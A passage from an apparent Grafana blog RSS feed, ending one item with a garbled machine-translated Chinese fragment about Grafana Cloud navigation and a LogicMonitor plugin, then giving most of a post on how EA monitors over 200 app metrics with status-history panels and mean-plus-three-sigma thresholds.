1600”/&gt;&#xA;&lt;/noscript&gt; &lt;/div&gt; &lt;/a&gt; &lt;/figie&gt;&#xA;&lt;p&gt;您可以在我们的&#xA;&lt;a href =“/docs/grafana-cloud/nervering-and-inm/irm/irm/manage/notifications/phone-and-sms/＃sync-imm-phone-numbers-to-your-to-your-contacts”&gt;技术文档&lt;/a&gt;。 &lt;/p&gt;&#xA;&lt;h2 id =“通过可观察性菜单&lt;/h2&gt;的简化导航&lt;/h2&gt;”&#xA;&lt;p&gt;我们已经更新了Grafana Cloud中的主要导航，以将所有可观察性工具放在一个菜单下，称为&lt;strong&gt;可观察性&lt;/strong&gt;。您现在会发现&#xA;&lt;&#xA;&lt;a href =“/products/cloud/frontend-observiable-for-real-user-monitoring/？pg = blog＆plcmt = body-txt”&gt; frontend observability &lt;/a&gt;，&#xA;&lt;a href =“/solutions/kubernetes/？pg = blog＆plcmt = body-txt”&gt; kubernetes监视&lt;/a&gt;，&#xA;&lt;a href =“/docs/grafana-cloud/Monitor-Infrastructure/monitor-cloud-provider/？pg = blog＆plcmt = body-txt”&gt;云提供者可观察&lt;/a&gt;，并且在一个地方进行了更多分组。&lt;/p&gt;&#xA;&lt;p&gt;此更改是我们提供的努力的一部分：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;在可观察性工具中更简单，更一致的体验&lt;/li&gt;&#xA;&lt;li&gt;更快地访问相关信号和工作流&lt;/li&gt;&#xA;&lt;li&gt;一个更深层次，背景意识故障排除的基础&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;请继续关注 -  &lt;/p&gt;将很快进行更多改进。&lt;/p&gt;&#xA;&lt;H2 ID =“ new-in-enterprise-data-sources-logicMonitor”&gt;企业数据来源中的新内容：LogicMonitor &lt;/h2&gt;&#xA;&lt;p&gt; LogicMonitor设备数据源插件使您能够查询和可视化&lt;code&gt;设备实例数据&lt;/code&gt;，并直接在Grafana云中直接在Grafana Cloud中直接在GrafAna Cloud中，&lt;Code&gt; Devage&gt; Device&gt; Decects &lt;/code&gt; &lt;/code&gt; &lt;/code&gt; dataSources &lt;/code&gt; &lt;/code &lt;/code&gt;。 &lt;/p&gt;&#xA;&lt;p&gt;了解有关使用和安装LogicMonitor数据源的更多信息&#xA;&lt;a href =“/docs/plugins/grafana-logicmonitor-datasource/最终/”&gt;文档&lt;/a&gt;。总的来说，要了解有关我们的企业数据源的更多信息，请参考&#xA;&lt;a href =“/blog/2024/05/13/grafana-enterprise-data-source-plugins-a-brief-guide-to-to-what-what-what-they-are and-and-and-how-how-to-how-to-to-to-get-started/”&gt;本指南&lt;/a&gt;。 &lt;/p&gt;&#xA;&lt;p&gt; &lt;em&gt;&#xA;&lt;a href =“/products/cloud/？pg = blog＆plcmt = body-txt”&gt; grafana云&lt;/a&gt;是开始事件响应和管理的最简单方法。我们有一个宽敞的永远的层次，并为每个用例都有计划。&#xA;&lt;a href =“/auth/ign-up/create-user？pg = blog＆redirectpath = irm”&gt;现在免费注册&lt;/a&gt;！&lt;/em&gt; &lt;/p&gt; &lt;/em&gt; &lt;/p&gt;</description>
      <pubDate>Wed, 25 Jun 2025 00:00:00 +0000</pubDate>
    </item>
    <item>
      <title>【From chaos to clarity with Grafana dashboards: How video game company EA monitors 200+ metrics】从混乱到清晰的Grafana仪表板：视频游戏公司如何监视200多个指标</title>
      <link>https://grafana.com/blog/2025/07/07/from-chaos-to-clarity-with-grafana-dashboards-how-video-game-company-ea-monitors-200-metrics/</link>
      <description>【&lt;p&gt;To be a successful gamer, you have to think strategically and creatively. Working as a software engineer at&#xA;&lt;a href=&#34;https://www.ea.com/&#34; target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;Electronic Arts&lt;/a&gt; (EA), a top video game company, requires the same skills. That&amp;rsquo;s especially true when it comes to monitoring the EA app, which is the launcher for EA games and used by hundreds of millions of people around the world.&lt;/p&gt;&#xA;&lt;p&gt;Monitoring the app&amp;rsquo;s status for errors, crash rates, and other issues can be as tricky as battling a game boss. For one thing, the app is run from users&amp;rsquo; own machines, and according to EA Software Engineer Kenny Chen, it emits 500 different events. Combining the events can result in potentially more than 4,000 possible metrics. Even if the reality ends up being a fraction of that, a developer could still be observing more than 200 core metrics at a time, making for what Chen calls a &amp;ldquo;huge and overwhelming&amp;rdquo; dashboard.&lt;/p&gt;&#xA;&lt;p&gt;In a&#xA;&lt;a href=&#34;/events/grafanacon/2025/electronic-arts-how-to-monitor-error-metrics/?pg=blog&amp;amp;plcmt=body-txt&#34;&gt;GrafanaCON 2025 presentation&lt;/a&gt;, Chen revealed how he used&#xA;&lt;a href=&#34;/oss/grafana?pg=blog&amp;amp;plcmt=body-txt&#34;&gt;Grafana&lt;/a&gt; to build what he calls a &amp;ldquo;functional dashboard&amp;rdquo; system that allows devs to effectively monitor the status of the app. In the past, a complete review would have been completed over several hours — &amp;ldquo;or maybe never, I’ll be honest,&amp;rdquo; he quipped — and now the work can be done in a fraction of that time. &amp;ldquo;Our devs, after proper training, can review 200 metrics in about 10 minutes,&amp;rdquo; he said, &amp;ldquo;and that makes it possible to always keep an eye on everything that’s important.&amp;rdquo;&lt;/p&gt;&#xA;&lt;p&gt;In his presentation, Chen discussed the importance of finding the most effective visualizations, the math behind effective monitoring, and large-scale root cause analysis.&lt;/p&gt;&#xA;&lt;p&gt;&amp;ldquo;Before this, we sometimes missed critical issues simply because there are so many things to look at and things were not very obvious,&amp;rdquo; Chen said. &amp;ldquo;Since we’ve set up this system, we haven’t missed any critical bugs caused by our own code changes.&amp;rdquo;&lt;/p&gt;&#xA;&lt;iframe width=&#34;560&#34; height=&#34;315&#34; src=&#34;https://www.youtube.com/embed/cqHO0oYW6Ic?si=bGMcbIuasD4%3frel%3d0&#34; title=&#34;YouTube video player&#34; frameborder=&#34;0&#34; allow=&#34;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&#34; referrerpolicy=&#34;strict-origin-when-cross-origin&#34; allowfullscreen&gt;&lt;/iframe&gt;&#xA;&lt;h2 id=&#34;big-challenges&#34;&gt;Big challenges&lt;/h2&gt;&#xA;&lt;p&gt;Work on the EA app comes with a challenge from the get-go. Unlike microservices, Chen explained, &amp;ldquo;an app is a monolith by design. You can’t split it further, and monoliths are just hard to monitor.&amp;rdquo;&lt;/p&gt;&#xA;&lt;p&gt;Among the metrics being tracked are logins, different types of errors, and various crash rates. &amp;ldquo;They are equally important to our user experience, and we need to closely monitor them all,&amp;rdquo; he said. &amp;ldquo;And whenever there’s a problem, we want to know as soon as possible.&amp;rdquo;&lt;/p&gt;&#xA;&lt;p&gt;With a backend service, engineers would be monitoring just one version of the app, but EA has multiple versions running at the same time. In their old dashboard, they utilized one gauge per version, per metric, in order to achieve full coverage for metrics.&lt;/p&gt;&#xA;&lt;p&gt;EA also releases new builds every week, so the version list being monitored is continuously growing.&lt;/p&gt;&#xA;&lt;p&gt;All of that translated to a dashboard like this:&lt;/p&gt;&#xA;&lt;figure&#xA;class=&#34;figure-wrapper figure-wrapper__lightbox w-100p &#34;&#xA;style=&#34;max-width: 960px;&#34;&#xA;itemprop=&#34;associatedMedia&#34;&#xA;itemscope=&#34;&#34;&#xA;itemtype=&#34;http://schema.org/ImageObject&#34;&#xA;&gt;&lt;a&#xA;class=&#34;lightbox-link&#34;&#xA;href=&#34;/media/blog/EA-dashboard/image-EA-dashboard-gauges-dashboard.png&#34;&#xA;itemprop=&#34;contentUrl&#34;&#xA;&gt;&lt;div class=&#34;img-wrapper w-100p h-auto&#34;&gt;&lt;img&#xA;class=&#34;lazyload &#34;&#xA;data-src=&#34;/media/blog/EA-dashboard/image-EA-dashboard-gauges-dashboard.png&#34;data-srcset=&#34;/media/blog/EA-dashboard/image-EA-dashboard-gauges-dashboard.png?w=320 320w, /media/blog/EA-dashboard/image-EA-dashboard-gauges-dashboard.png?w=550 550w, /media/blog/EA-dashboard/image-EA-dashboard-gauges-dashboard.png?w=750 750w, /media/blog/EA-dashboard/image-EA-dashboard-gauges-dashboard.png?w=900 900w, /media/blog/EA-dashboard/image-EA-dashboard-gauges-dashboard.png?w=1040 1040w, /media/blog/EA-dashboard/image-EA-dashboard-gauges-dashboard.png?w=1240 1240w, /media/blog/EA-dashboard/image-EA-dashboard-gauges-dashboard.png?w=1920 1920w&#34;&#xA;data-sizes=&#34;auto&#34;alt=&#34;A Grafana dashboard with 165 gauge panels&#34;width=&#34;960&#34;height=&#34;540&#34;/&gt;&#xA;&lt;noscript&gt;&#xA;&lt;img&#xA;src=&#34;/media/blog/EA-dashboard/image-EA-dashboard-gauges-dashboard.png&#34;&#xA;alt=&#34;A Grafana dashboard with 165 gauge panels&#34;width=&#34;960&#34;height=&#34;540&#34;/&gt;&#xA;&lt;/noscript&gt;&lt;/div&gt;&lt;/a&gt;&lt;/figure&gt;&#xA;&lt;p&gt;To make matters worse, the team realized all of those gauges couldn&amp;rsquo;t be trusted, Chen said.&lt;/p&gt;&#xA;&lt;p&gt;&amp;ldquo;A gauge can mean a lot of things: It could show the last reading, it could show the median, it could show the average. If you have a dashboard full of gauges, it’s really easy to make things up. Plus gauges are kind of vague by design. Totally different situations can look exactly the same on a gauge.&amp;rdquo;&lt;/p&gt;&#xA;&lt;figure&#xA;class=&#34;figure-wrapper figure-wrapper__lightbox w-100p &#34;&#xA;style=&#34;max-width: 960px;&#34;&#xA;itemprop=&#34;associatedMedia&#34;&#xA;itemscope=&#34;&#34;&#xA;itemtype=&#34;http://schema.org/ImageObject&#34;&#xA;&gt;&lt;a&#xA;class=&#34;lightbox-link&#34;&#xA;href=&#34;/media/blog/EA-dashboard/image-EA-dashboard-trust-gauges.png&#34;&#xA;itemprop=&#34;contentUrl&#34;&#xA;&gt;&lt;div class=&#34;img-wrapper w-100p h-auto&#34;&gt;&lt;img&#xA;class=&#34;lazyload &#34;&#xA;data-src=&#34;/media/blog/EA-dashboard/image-EA-dashboard-trust-gauges.png&#34;data-srcset=&#34;/media/blog/EA-dashboard/image-EA-dashboard-trust-gauges.png?w=320 320w, /media/blog/EA-dashboard/image-EA-dashboard-trust-gauges.png?w=550 550w, /media/blog/EA-dashboard/image-EA-dashboard-trust-gauges.png?w=750 750w, /media/blog/EA-dashboard/image-EA-dashboard-trust-gauges.png?w=900 900w, /media/blog/EA-dashboard/image-EA-dashboard-trust-gauges.png?w=1040 1040w, /media/blog/EA-dashboard/image-EA-dashboard-trust-gauges.png?w=1240 1240w, /media/blog/EA-dashboard/image-EA-dashboard-trust-gauges.png?w=1920 1920w&#34;&#xA;data-sizes=&#34;auto&#34;alt=&#34;A gauge panel at .23% on the left and two related graphs on the right, one that requires action and one that does not &#34;width=&#34;960&#34;height=&#34;540&#34;/&gt;&#xA;&lt;noscript&gt;&#xA;&lt;img&#xA;src=&#34;/media/blog/EA-dashboard/image-EA-dashboard-trust-gauges.png&#34;&#xA;alt=&#34;A gauge panel at .23% on the left and two related graphs on the right, one that requires action and one that does not &#34;width=&#34;960&#34;height=&#34;540&#34;/&gt;&#xA;&lt;/noscript&gt;&lt;/div&gt;&lt;/a&gt;&lt;/figure&gt;&#xA;&lt;h2 id=&#34;leveling-up-visualizations&#34;&gt;Leveling-up visualizations&lt;/h2&gt;&#xA;&lt;p&gt;Visualizations can fall across a spectrum that ranges from simple to complex, and with information that can range from sparse to dense, Chen explained.&lt;/p&gt;&#xA;&lt;p&gt;Time series contain every data point in a history but, &amp;ldquo;they’re not very easy to scan when you have tons of them,&amp;rdquo; he said. Like gauges, they don&amp;rsquo;t work well for monitoring a significant amount of metrics, so the goal at EA was to find something that was both simple and informative.&lt;/p&gt;&#xA;&lt;p&gt;The solution: status history.&lt;/p&gt;&#xA;&lt;p&gt;&amp;ldquo;You can think of a status history panel like a colored calendar,&amp;rdquo; Chen said. &amp;ldquo;You can stack rows with different meanings, and each cell is like a time block — for example, an hour.&amp;rdquo;&lt;/p&gt;&#xA;&lt;figure&#xA;class=&#34;figure-wrapper figure-wrapper__lightbox w-100p &#34;&#xA;style=&#34;max-width: 960px;&#34;&#xA;itemprop=&#34;associatedMedia&#34;&#xA;itemscope=&#34;&#34;&#xA;itemtype=&#34;http://schema.org/ImageObject&#34;&#xA;&gt;&lt;a&#xA;class=&#34;lightbox-link&#34;&#xA;href=&#34;/media/blog/EA-dashboard/image-EA-dashboard-status-history.png&#34;&#xA;itemprop=&#34;contentUrl&#34;&#xA;&gt;&lt;div class=&#34;img-wrapper w-100p h-auto&#34;&gt;&lt;img&#xA;class=&#34;lazyload &#34;&#xA;data-src=&#34;/media/blog/EA-dashboard/image-EA-dashboard-status-history.png&#34;data-srcset=&#34;/media/blog/EA-dashboard/image-EA-dashboard-status-history.png?w=320 320w, /media/blog/EA-dashboard/image-EA-dashboard-status-history.png?w=550 550w, /media/blog/EA-dashboard/image-EA-dashboard-status-history.png?w=750 750w, /media/blog/EA-dashboard/image-EA-dashboard-status-history.png?w=900 900w, /media/blog/EA-dashboard/image-EA-dashboard-status-history.png?w=1040 1040w, /media/blog/EA-dashboard/image-EA-dashboard-status-history.png?w=1240 1240w, /media/blog/EA-dashboard/image-EA-dashboard-status-history.png?w=1920 1920w&#34;&#xA;data-sizes=&#34;auto&#34;alt=&#34;A slide called Status history that shows a two rows of color-coded boxes that relate to rate and volume&#34;width=&#34;960&#34;height=&#34;540&#34;/&gt;&#xA;&lt;noscript&gt;&#xA;&lt;img&#xA;src=&#34;/media/blog/EA-dashboard/image-EA-dashboard-status-history.png&#34;&#xA;alt=&#34;A slide called Status history that shows a two rows of color-coded boxes that relate to rate and volume&#34;width=&#34;960&#34;height=&#34;540&#34;/&gt;&#xA;&lt;/noscript&gt;&lt;/div&gt;&lt;/a&gt;&lt;/figure&gt;&#xA;&lt;p&gt;In the example above, different colors are used to show whether a metric is good or bad, based on thresholds. &amp;ldquo;The key is, it’s got a time axis and it’s color-coded. That makes it super useful,&amp;rdquo; Chen said.&lt;/p&gt;&#xA;&lt;p&gt;This type of visualization makes it easy to quickly spot patterns, such as which metric is improving or which one is in trouble. It also lets the EA team observe many app versions in a compact way.&lt;/p&gt;&#xA;&lt;p&gt;&amp;ldquo;Instead of having a gauge for each version, we can just have one status history panel that can automatically display the most popular versions in just one panel.&amp;rdquo;&lt;/p&gt;&#xA;&lt;figure&#xA;class=&#34;figure-wrapper figure-wrapper__lightbox w-100p &#34;&#xA;style=&#34;max-width: 960px;&#34;&#xA;itemprop=&#34;associatedMedia&#34;&#xA;itemscope=&#34;&#34;&#xA;itemtype=&#34;http://schema.org/ImageObject&#34;&#xA;&gt;&lt;a&#xA;class=&#34;lightbox-link&#34;&#xA;href=&#34;/media/blog/EA-dashboard/image-EA-dashboard-multiple-versions.png&#34;&#xA;itemprop=&#34;contentUrl&#34;&#xA;&gt;&lt;div class=&#34;img-wrapper w-100p h-auto&#34;&gt;&lt;img&#xA;class=&#34;lazyload &#34;&#xA;data-src=&#34;/media/blog/EA-dashboard/image-EA-dashboard-multiple-versions.png&#34;data-srcset=&#34;/media/blog/EA-dashboard/image-EA-dashboard-multiple-versions.png?w=320 320w, /media/blog/EA-dashboard/image-EA-dashboard-multiple-versions.png?w=550 550w, /media/blog/EA-dashboard/image-EA-dashboard-multiple-versions.png?w=750 750w, /media/blog/EA-dashboard/image-EA-dashboard-multiple-versions.png?w=900 900w, /media/blog/EA-dashboard/image-EA-dashboard-multiple-versions.png?w=1040 1040w, /media/blog/EA-dashboard/image-EA-dashboard-multiple-versions.png?w=1240 1240w, /media/blog/EA-dashboard/image-EA-dashboard-multiple-versions.png?w=1920 1920w&#34;&#xA;data-sizes=&#34;auto&#34;alt=&#34;A panel with three rows of green boxes, each related to a different app version at different time intervals&#34;width=&#34;960&#34;height=&#34;540&#34;/&gt;&#xA;&lt;noscript&gt;&#xA;&lt;img&#xA;src=&#34;/media/blog/EA-dashboard/image-EA-dashboard-multiple-versions.png&#34;&#xA;alt=&#34;A panel with three rows of green boxes, each related to a different app version at different time intervals&#34;width=&#34;960&#34;height=&#34;540&#34;/&gt;&#xA;&lt;/noscript&gt;&lt;/div&gt;&lt;/a&gt;&lt;/figure&gt;&#xA;&lt;p&gt;A panel like this also helps the team spot different types of issues. Referencing the image below as an example, Chen said, &amp;ldquo;If only the latest version is red, it indicates a regression.&amp;rdquo;&lt;/p&gt;&#xA;&lt;figure&#xA;class=&#34;figure-wrapper figure-wrapper__lightbox w-100p &#34;&#xA;style=&#34;max-width: 960px;&#34;&#xA;itemprop=&#34;associatedMedia&#34;&#xA;itemscope=&#34;&#34;&#xA;itemtype=&#34;http://schema.org/ImageObject&#34;&#xA;&gt;&lt;a&#xA;class=&#34;lightbox-link&#34;&#xA;href=&#34;/media/blog/EA-dashboard/image-EA-dashboard-regression.png&#34;&#xA;itemprop=&#34;contentUrl&#34;&#xA;&gt;&lt;div class=&#34;img-wrapper w-100p h-auto&#34;&gt;&lt;img&#xA;class=&#34;lazyload &#34;&#xA;data-src=&#34;/media/blog/EA-dashboard/image-EA-dashboard-regression.png&#34;data-srcset=&#34;/media/blog/EA-dashboard/image-EA-dashboard-regression.png?w=320 320w, /media/blog/EA-dashboard/image-EA-dashboard-regression.png?w=550 550w, /media/blog/EA-dashboard/image-EA-dashboard-regression.png?w=750 750w, /media/blog/EA-dashboard/image-EA-dashboard-regression.png?w=900 900w, /media/blog/EA-dashboard/image-EA-dashboard-regression.png?w=1040 1040w, /media/blog/EA-dashboard/image-EA-dashboard-regression.png?w=1240 1240w, /media/blog/EA-dashboard/image-EA-dashboard-regression.png?w=1920 1920w&#34;&#xA;data-sizes=&#34;auto&#34;alt=&#34;A panel with three rows of boxes for three app versions, with one red row and two green ones&#34;width=&#34;960&#34;height=&#34;540&#34;/&gt;&#xA;&lt;noscript&gt;&#xA;&lt;img&#xA;src=&#34;/media/blog/EA-dashboard/image-EA-dashboard-regression.png&#34;&#xA;alt=&#34;A panel with three rows of boxes for three app versions, with one red row and two green ones&#34;width=&#34;960&#34;height=&#34;540&#34;/&gt;&#xA;&lt;/noscript&gt;&lt;/div&gt;&lt;/a&gt;&lt;/figure&gt;&#xA;&lt;p&gt;On the other hand, if all versions suddenly go red at the same time, that likely indicates the problem is an external outage.&lt;/p&gt;&#xA;&lt;figure&#xA;class=&#34;figure-wrapper figure-wrapper__lightbox w-100p &#34;&#xA;style=&#34;max-width: 960px;&#34;&#xA;itemprop=&#34;associatedMedia&#34;&#xA;itemscope=&#34;&#34;&#xA;itemtype=&#34;http://schema.org/ImageObject&#34;&#xA;&gt;&lt;a&#xA;class=&#34;lightbox-link&#34;&#xA;href=&#34;/media/blog/EA-dashboard/image-EA-dashboard-external-issue.png&#34;&#xA;itemprop=&#34;contentUrl&#34;&#xA;&gt;&lt;div class=&#34;img-wrapper w-100p h-auto&#34;&gt;&lt;img&#xA;class=&#34;lazyload &#34;&#xA;data-src=&#34;/media/blog/EA-dashboard/image-EA-dashboard-external-issue.png&#34;data-srcset=&#34;/media/blog/EA-dashboard/image-EA-dashboard-external-issue.png?w=320 320w, /media/blog/EA-dashboard/image-EA-dashboard-external-issue.png?w=550 550w, /media/blog/EA-dashboard/image-EA-dashboard-external-issue.png?w=750 750w, /media/blog/EA-dashboard/image-EA-dashboard-external-issue.png?w=900 900w, /media/blog/EA-dashboard/image-EA-dashboard-external-issue.png?w=1040 1040w, /media/blog/EA-dashboard/image-EA-dashboard-external-issue.png?w=1240 1240w, /media/blog/EA-dashboard/image-EA-dashboard-external-issue.png?w=1920 1920w&#34;&#xA;data-sizes=&#34;auto&#34;alt=&#34;A panel with three rows representing app versions, with green boxes on left half of the rows and red on the right half&#34;width=&#34;960&#34;height=&#34;540&#34;/&gt;&#xA;&lt;noscript&gt;&#xA;&lt;img&#xA;src=&#34;/media/blog/EA-dashboard/image-EA-dashboard-external-issue.png&#34;&#xA;alt=&#34;A panel with three rows representing app versions, with green boxes on left half of the rows and red on the right half&#34;width=&#34;960&#34;height=&#34;540&#34;/&gt;&#xA;&lt;/noscript&gt;&lt;/div&gt;&lt;/a&gt;&lt;/figure&gt;&#xA;&lt;h2 id=&#34;finding-good-thresholds&#34;&gt;Finding good thresholds&lt;/h2&gt;&#xA;&lt;p&gt;Although color-coding is an effective visualization tool, it&amp;rsquo;s not perfect. As Chen noted, &amp;ldquo;If you just randomly pick a threshold, the same metric can look good or bad for no real reason.&amp;rdquo;&lt;/p&gt;&#xA;&lt;p&gt;To choose an ideal threshold, the first step is to check the histogram of your metric.&lt;/p&gt;&#xA;&lt;figure&#xA;class=&#34;figure-wrapper figure-wrapper__lightbox w-100p &#34;&#xA;style=&#34;max-width: 960px;&#34;&#xA;itemprop=&#34;associatedMedia&#34;&#xA;itemscope=&#34;&#34;&#xA;itemtype=&#34;http://schema.org/ImageObject&#34;&#xA;&gt;&lt;a&#xA;class=&#34;lightbox-link&#34;&#xA;href=&#34;/media/blog/EA-dashboard/image-EA-dashboard-timeseries-vs-histogram.png&#34;&#xA;itemprop=&#34;contentUrl&#34;&#xA;&gt;&lt;div class=&#34;img-wrapper w-100p h-auto&#34;&gt;&lt;img&#xA;class=&#34;lazyload &#34;&#xA;data-src=&#34;/media/blog/EA-dashboard/image-EA-dashboard-timeseries-vs-histogram.png&#34;data-srcset=&#34;/media/blog/EA-dashboard/image-EA-dashboard-timeseries-vs-histogram.png?w=320 320w, /media/blog/EA-dashboard/image-EA-dashboard-timeseries-vs-histogram.png?w=550 550w, /media/blog/EA-dashboard/image-EA-dashboard-timeseries-vs-histogram.png?w=750 750w, /media/blog/EA-dashboard/image-EA-dashboard-timeseries-vs-histogram.png?w=900 900w, /media/blog/EA-dashboard/image-EA-dashboard-timeseries-vs-histogram.png?w=1040 1040w, /media/blog/EA-dashboard/image-EA-dashboard-timeseries-vs-histogram.png?w=1240 1240w, /media/blog/EA-dashboard/image-EA-dashboard-timeseries-vs-histogram.png?w=1920 1920w&#34;&#xA;data-sizes=&#34;auto&#34;alt=&#34;Side-by-side images of an hourly time series graph and an hourly error rate histogram&#34;width=&#34;960&#34;height=&#34;540&#34;/&gt;&#xA;&lt;noscript&gt;&#xA;&lt;img&#xA;src=&#34;/media/blog/EA-dashboard/image-EA-dashboard-timeseries-vs-histogram.png&#34;&#xA;alt=&#34;Side-by-side images of an hourly time series graph and an hourly error rate histogram&#34;width=&#34;960&#34;height=&#34;540&#34;/&gt;&#xA;&lt;/noscript&gt;&lt;/div&gt;&lt;/a&gt;&lt;/figure&gt;&#xA;&lt;p&gt;The graph above-left is a normal time series, while the image on the right is a histogram of the same metric. &amp;ldquo;The histogram shows how often each value comes up,&amp;rdquo; Chen explained.&lt;/p&gt;&#xA;&lt;p&gt;Taking a closer look, the histogram is showing the frequency of each possible value in the past seven days.&lt;/p&gt;&#xA;&lt;figure&#xA;class=&#34;figure-wrapper figure-wrapper__lightbox w-100p &#34;&#xA;style=&#34;max-width: 960px;&#34;&#xA;itemprop=&#34;associatedMedia&#34;&#xA;itemscope=&#34;&#34;&#xA;itemtype=&#34;http://schema.org/ImageObject&#34;&#xA;&gt;&lt;a&#xA;class=&#34;lightbox-link&#34;&#xA;href=&#34;/media/blog/EA-dashboard/image-EA-dashboard-histogram.png&#34;&#xA;itemprop=&#34;contentUrl&#34;&#xA;&gt;&lt;div class=&#34;img-wrapper w-100p h-auto&#34;&gt;&lt;img&#xA;class=&#34;lazyload &#34;&#xA;data-src=&#34;/media/blog/EA-dashboard/image-EA-dashboard-histogram.png&#34;data-srcset=&#34;/media/blog/EA-dashboard/image-EA-dashboard-histogram.png?w=320 320w, /media/blog/EA-dashboard/image-EA-dashboard-histogram.png?w=550 550w, /media/blog/EA-dashboard/image-EA-dashboard-histogram.png?w=750 750w, /media/blog/EA-dashboard/image-EA-dashboard-histogram.png?w=900 900w, /media/blog/EA-dashboard/image-EA-dashboard-histogram.png?w=1040 1040w, /media/blog/EA-dashboard/image-EA-dashboard-histogram.png?w=1240 1240w, /media/blog/EA-dashboard/image-EA-dashboard-histogram.png?w=1920 1920w&#34;&#xA;data-sizes=&#34;auto&#34;alt=&#34;An image showing how to read a histogram, highlighting a high point and a low point&#34;width=&#34;960&#34;height=&#34;540&#34;/&gt;&#xA;&lt;noscript&gt;&#xA;&lt;img&#xA;src=&#34;/media/blog/EA-dashboard/image-EA-dashboard-histogram.png&#34;&#xA;alt=&#34;An image showing how to read a histogram, highlighting a high point and a low point&#34;width=&#34;960&#34;height=&#34;540&#34;/&gt;&#xA;&lt;/noscript&gt;&lt;/div&gt;&lt;/a&gt;&lt;/figure&gt;&#xA;&lt;p&gt;In the above example, the metric was at 1.5% for 22 hours and at 2.1% for one hour. &amp;ldquo;It should look like a bell curve,&amp;rdquo; Chen explained — and the reason for that is based on the Central Limit Theorem. &amp;ldquo;If your metric comes from many independent random events, it should follow a normal distribution,&amp;rdquo; he said. &amp;ldquo;And this often works for error rates.&amp;rdquo;&lt;/p&gt;&#xA;&lt;p&gt;With a normal distribution, values shouldn’t go too high above the mean. You could draw a line to show the boundary between what’s likely to happen and what’s unlikely to happen, he said. &amp;ldquo;If you see a bunch of unlikely values, something&amp;rsquo;s fundamentally changed.&amp;rdquo; It could be a new bug or a new incident, for example. &amp;ldquo;The boundary is a really good place to put your threshold for good or bad.&amp;rdquo;&lt;/p&gt;&#xA;&lt;figure&#xA;class=&#34;figure-wrapper figure-wrapper__lightbox w-100p &#34;&#xA;style=&#34;max-width: 960px;&#34;&#xA;itemprop=&#34;associatedMedia&#34;&#xA;itemscope=&#34;&#34;&#xA;itemtype=&#34;http://schema.org/ImageObject&#34;&#xA;&gt;&lt;a&#xA;class=&#34;lightbox-link&#34;&#xA;href=&#34;/media/blog/EA-dashboard/image-EA-dashboard-3sigma.png&#34;&#xA;itemprop=&#34;contentUrl&#34;&#xA;&gt;&lt;div class=&#34;img-wrapper w-100p h-auto&#34;&gt;&lt;img&#xA;class=&#34;lazyload &#34;&#xA;data-src=&#34;/media/blog/EA-dashboard/image-EA-dashboard-3sigma.png&#34;data-srcset=&#34;/media/blog/EA-dashboard/image-EA-dashboard-3sigma.png?w=320 320w, /media/blog/EA-dashboard/image-EA-dashboard-3sigma.png?w=550 550w, /media/blog/EA-dashboard/image-EA-dashboard-3sigma.png?w=750 750w, /media/blog/EA-dashboard/image-EA-dashboard-3sigma.png?w=900 900w, /media/blog/EA-dashboard/image-EA-dashboard-3sigma.png?w=1040 1040w, /media/blog/EA-dashboard/image-EA-dashboard-3sigma.png?w=1240 1240w, /media/blog/EA-dashboard/image-EA-dashboard-3sigma.png?w=1920 1920w&#34;&#xA;data-sizes=&#34;auto&#34;alt=&#34;A graph illustrating the 3-sigma (standard deviation rule) and a similar shaped histogram labeled &amp;#39;good&amp;#39;, and a part of it with no values, labeled &amp;#39;bad&amp;#39;&#34;width=&#34;960&#34;height=&#34;540&#34;/&gt;&#xA;&lt;noscript&gt;&#xA;&lt;img&#xA;src=&#34;/media/blog/EA-dashboard/image-EA-dashboard-3sigma.png&#34;&#xA;alt=&#34;A graph illustrating the 3-sigma (standard deviation rule) and a similar shaped histogram labeled &amp;#39;good&amp;#39;, and a part of it with no values, labeled &amp;#39;bad&amp;#39;&#34;width=&#34;960&#34;height=&#34;540&#34;/&gt;&#xA;&lt;/noscript&gt;&lt;/div&gt;&lt;/a&gt;&lt;/figure&gt;&#xA;&lt;p&gt;This is the formula Chen uses to calculate the threshold:&lt;/p&gt;&#xA;&lt;figure&#xA;class=&#34;figure-wrapper figure-wrapper__lightbox w-100p &#34;&#xA;style=&#34;max-width: 960px;&#34;&#xA;itemprop=&#34;associatedMedia&#34;&#xA;itemscope=&#34;&#34;&#xA;itemtype=&#34;http://schema.org/ImageObject&#34;&#xA;&gt;&lt;a&#xA;class=&#34;lightbox-link&#34;&#xA;href=&#34;/media/blog/EA-dashboard/image-EA-dashboard-in-action.png&#34;&#xA;itemprop=&#34;contentUrl&#34;&#xA;&gt;&lt;div class=&#34;img-wrapper w-100p h-auto&#34;&gt;&lt;img&#xA;class=&#34;lazyload &#34;&#xA;data-src=&#34;/media/blog/EA-dashboard/image-EA-dashboard-in-action.png&#34;data-srcset=&#34;/media/blog/EA-dashboard/image-EA-dashboard-in-action.png?w=320 320w, /media/blog/EA-dashboard/image-EA-dashboard-in-action.png?w=550 550w, /media/blog/EA-dashboard/image-EA-dashboard-in-action.png?w=750 750w, /media/blog/EA-dashboard/image-EA-dashboard-in-action.png?w=900 900w, /media/blog/EA-dashboard/image-EA-dashboard-in-action.png?w=1040 1040w, /media/blog/EA-dashboard/image-EA-dashboard-in-action.png?w=1240 1240w, /media/blog/EA-dashboard/image-EA-dashboard-in-action.png?w=1920 1920w&#34;&#xA;data-sizes=&#34;auto&#34;alt=&#34;A slide with a time series graph for a metric and a formula to create its threshold: Threshold = mean &amp;#43; 3 * stddev&#34;width=&#34;960&#34;height=&#34;540&#34;/&gt;&#xA;&lt;noscript&gt;&#xA;&lt;img&#xA;src=&#34;/media/blog/EA-dashboard/image-EA-dashboard-in-action.png&#34;&#xA;alt=&#34;A slide with a time series graph for a metric and a formula to create its threshold: Threshold = mean &amp;#43; 3 * stddev&#34;width=&#34;960&#34;height=&#34;540&#34;/&gt;&#xA;&lt;/noscript&gt;&lt;/div&gt;&lt;/a&gt;&lt;/figure&gt;&#xA;&lt;h2 id=&#34;big-payoff&#34;&gt;Big payoff&lt;/h2&gt;&#xA;&lt;p&gt;Today, rather than looking at an overwhelming dashboard of gauges, the EA team has a dashboard where they can better observe things such as external issues, regressions, bugs fixed, and external issues that are resolved.&lt;/p&gt;&#xA;&lt;figure&#xA;class=&#34;figure-wrapper figure-wrapper__lightbox w-100p &#34;&#xA;style=&#34;max-width: 